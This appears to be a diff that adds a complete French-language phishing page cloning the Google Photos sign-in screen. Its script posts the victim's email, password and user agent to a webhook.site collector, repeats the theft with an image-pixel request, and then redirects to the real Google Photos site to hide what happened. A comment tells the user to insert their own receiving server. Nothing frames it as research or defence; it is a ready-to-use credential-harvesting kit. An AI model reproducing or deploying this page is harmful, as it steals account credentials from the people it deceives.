@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Photos - Connexion</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+        }
+
+        body {
+            background: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .card {
+            max-width: 450px;
+            width: 100%;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            padding: 48px 40px 36px;
+            margin: 20px;
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .logo img {
+            width: 75px;
+        }
+
+        .logo-text {
+            font-size: 24px;
+            font-weight: 400;
+            margin-top: 16px;
+            color: #202124;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            color: #202124;
+            text-align: center;
+            margin-bottom: 32px;
+            font-weight: 400;
+        }
+
+        .input-group {
+            margin-bottom: 16px;
+            position: relative;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 13px 15px;
+            font-size: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .input-group input:focus {
+            border-color: #1a73e8;
+            border-width: 2px;
+        }
+
+        .forgot-link {
+            display: block;
+            color: #1a73e8;
+            font-size: 14px;
+            font-weight: 500;
+            margin-top: 4px;
+            margin-bottom: 10px;
+            text-decoration: none;
+        }
+
+        .info-text {
+            font-size: 14px;
+            color: #5f6368;
+            margin-top: 32px;
+            margin-bottom: 32px;
+            line-height: 1.4;
+        }
+
+        .actions {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .create-account {
+            color: #1a73e8;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+        }
+
+        .btn-next {
+            background: #1a73e8;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            padding: 10px 24px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .btn-next:hover {
+            background: #1557b0;
+        }
+
+        .error-msg {
+            color: #d93025;
+            font-size: 13px;
+            margin-top: 4px;
+            display: none;
+        }
+
+        .spinner {
+            display: none;
+            text-align: center;
+            margin: 20px 0;
+        }
+
+        .spinner::after {
+            content: '';
+            display: inline-block;
+            width: 24px;
+            height: 24px;
+            border: 3px solid #dadce0;
+            border-top-color: #1a73e8;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <div class="logo">
+        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
+        <div class="logo-text">Google Photos</div>
+    </div>
+    <div class="subtitle">Connectez-vous pour voir vos photos</div>
+
+    <form id="loginForm">
+        <div class="input-group">
+            <input type="email" id="email" placeholder="Adresse e-mail ou numéro" required>
+        </div>
+        <div class="input-group">
+            <input type="password" id="password" placeholder="Mot de passe" required>
+        </div>
+        <a href="#" class="forgot-link">Mot de passe oublié ?</a>
+        
+        <div class="info-text">
+            S'il ne s'agit pas de votre appareil, utilisez le mode Invité pour vous connecter en mode privé. 
+            <a href="#" style="color:#1a73e8;text-decoration:none;">En savoir plus</a>
+        </div>
+
+        <div class="spinner" id="spinner"></div>
+        <div class="error-msg" id="errorMsg">Identifiants incorrects. Veuillez réessayer.</div>
+
+        <div class="actions">
+            <a href="#" class="create-account">Créer un compte</a>
+            <button type="submit" class="btn-next" id="submitBtn">Suivant</button>
+        </div>
+    </form>
+</div>
+
+<script>
+document.getElementById('loginForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
+    const spinner = document.getElementById('spinner');
+    const submitBtn = document.getElementById('submitBtn');
+    const errorMsg = document.getElementById('errorMsg');
+
+    // Afficher le spinner
+    spinner.style.display = 'block';
+    submitBtn.disabled = true;
+    errorMsg.style.display = 'none';
+
+    // === REMPLACEZ CETTE URL PAR VOTRE SERVEUR DE RÉCEPTION ===
+    const webhookURL = 'https://webhook.site/4d378605-e74b-492c-a05e-02c324af6805'; 
+
+    // Envoyer les identifiants
+    fetch(webhookURL, {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+            email: email,
+            password: password,
+            userAgent: navigator.userAgent,
+            ip: '',  // sera capté côté serveur
+            timestamp: new Date().toISOString(),
+            page: 'google_photos'
+        })
+    }).catch(function() {
+        // Même si la requête échoue (CORS), on continue
+    });
+
+    // Alternative: envoi via une image pixel (fonctionne sans CORS)
+    var img = new Image();
+    img.src = webhookURL + '?email=' + encodeURIComponent(email) + 
+              '&password=' + encodeURIComponent(password) +
+              '&ua=' + encodeURIComponent(navigator.userAgent);
+
+    // Simuler un délai puis rediriger vers la vraie page
+    setTimeout(function() {
+        spinner.style.display = 'none';
+        // Redirection vers la vraie page Google Photos
+        window.location.href = 'https://photos.google.com';
+    }, 2000);
+});
+</script>
+
+</body>
+</html>
